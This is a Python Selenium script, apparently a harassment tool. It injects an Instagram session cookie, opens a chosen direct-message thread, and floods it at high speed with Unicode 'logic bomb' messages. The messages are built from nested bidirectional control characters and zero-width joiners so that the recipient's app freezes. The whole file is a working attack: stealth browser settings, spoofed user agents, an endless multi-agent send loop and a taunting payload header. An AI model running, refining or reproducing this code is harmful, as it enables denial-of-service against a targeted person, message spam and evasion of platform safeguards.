# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (LOGIC-BOMB V64)
# 📅 STATUS: UI-THREAD-HIJACK | 4-AGENT TOTAL | AWS-CPU-MAX

import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium_stealth import stealth
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

# --- 4 AGENTS TOTAL CONFIG ---
AGENTS_PER_MACHINE = 2             
TOTAL_DURATION = 25000 
BURST_SPEED = (0.05, 0.15)  # 🔥 High Frequency Strike
REST_AFTER_STRIKES = 150   
REST_DURATION = 3          

GLOBAL_SENT = 0
COUNTER_LOCK = threading.Lock()
BROWSER_LAUNCH_LOCK = threading.Lock()

def get_logic_bomb_payload():
    """Generates a recursive layout block that forces a Main-Thread lock."""
    u_id = random.randint(100, 999)
    # \u2066 = LRI | \u2067 = RLI | \u2069 = PDI
    # \u200D = ZWJ (Zero Width Joiner)
    lri, rli, pdi, zwj = "\u2066", "\u2067", "\u2069", "\u200D"
    
    header = f"👑 PRAVEER PAPA ON TOP 🌙 [V64_LOCK:{u_id}]"
    
    body = []
    # 250 lines of recursive 'Directional Flip-Flopping'
    for i in range(250):
        # We alternate text direction 5 times PER WORD.
        # This forces the HarfBuzz engine to restart the layout process 1,250 times.
        nest = f"{lri}PR{pdi}{rli}AV{pdi}{lri}EE{pdi}{rli}R{pdi} {lri}PAPA{pdi} 🌙"
        body.append(f"{nest} {i}{zwj*5}")
        
    return f"{header}\n{chr(10).join(body)}".strip()[:9990]

def get_driver(agent_id):
    with BROWSER_LAUNCH_LOCK:
        chrome_options = Options()
        chrome_options.add_argument("--headless=new") 
        chrome_options.add_argument("--no-sandbox") 
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-gpu")
        chrome_options.binary_location = "/usr/bin/google-chrome"
        
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
        chrome_options.add_argument(f"user-agent={ua}")
        
        driver = webdriver.Chrome(options=chrome_options)
        stealth(driver, languages=["en-US"], vendor="Google Inc.", platform="Win32", fix_hairline=True)
        return driver

def atomic_dispatch_send(driver, text):
    """Bypasses the 'Typing' hang by using a Trusted Event Dispatcher."""
    try:
        driver.execute_script("""
            var box = document.querySelector('div[role="textbox"], textarea');
            if (box) {
                box.focus();
                // 1. Reset state
                document.execCommand('selectAll', false, null);
                document.execCommand('delete', false, null);
                // 2. Inject payload
                document.execCommand('insertText', false, arguments[0]);
                // 3. Force Internal State Update
                box.dispatchEvent(new Event('input', { bubbles: true }));
                // 4. Force Enter Key
                var e = new KeyboardEvent('keydown', {
                    key: 'Enter', code: 'Enter', keyCode: 13, which: 13, 
                    bubbles: true, cancelable: true
                });
                box.dispatchEvent(e);
            }
        """, text)
        return True
    except: return False

def run_life_cycle(agent_id, cookie, target):
    while True:
        try:
            driver = get_driver(agent_id)
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
            driver.get(f"https://www.instagram.com/direct/t/{target}/")
            time.sleep(12) 
            
            strike_count = 0
            while True:
                payload = get_logic_bomb_payload()
                if atomic_dispatch_send(driver, payload):
                    strike_count += 1
                    with COUNTER_LOCK:
                        global GLOBAL_SENT
                        GLOBAL_SENT += 1
                    print(f"Agent {agent_id}: Logic-Strike ({GLOBAL_SENT})")
                    
                    if strike_count % 80 == 0:
                        driver.refresh()
                        time.sleep(5)
                time.sleep(random.uniform(*BURST_SPEED))
        except: pass
        finally:
            try: driver.quit()
            except: pass
            time.sleep(3)

def main():
    cookie = os.environ.get("INSTA_COOKIE", "").strip()
    target = os.environ.get("TARGET_THREAD_ID", "").strip()
    with ThreadPoolExecutor(max_workers=AGENTS_PER_MACHINE) as executor:
        for i in range(AGENTS_PER_MACHINE):
            executor.submit(run_life_cycle, i+1, cookie, target)

if __name__ == "__main__":
    main()
